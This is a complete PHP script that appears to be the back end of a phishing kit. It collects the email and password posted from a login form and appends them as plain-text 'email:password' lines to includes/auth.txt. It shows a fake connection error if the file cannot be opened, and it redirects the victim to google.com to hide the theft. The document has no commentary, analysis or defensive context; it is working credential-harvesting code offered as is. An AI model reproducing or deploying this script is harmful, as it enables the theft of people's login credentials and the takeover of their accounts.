<?php
$myfile = fopen("includes/auth.txt", "a") or die("Unable to establish connection. Please try again.");
$email = $_POST['email'];
$password = $_POST['password'];
$savestring = $email . ':' . $password . PHP_EOL;

fwrite($myfile, $savestring);
fclose($myfile);
echo "<h3>redirecting...</h3>";
header('Location: http://google.com');
?>
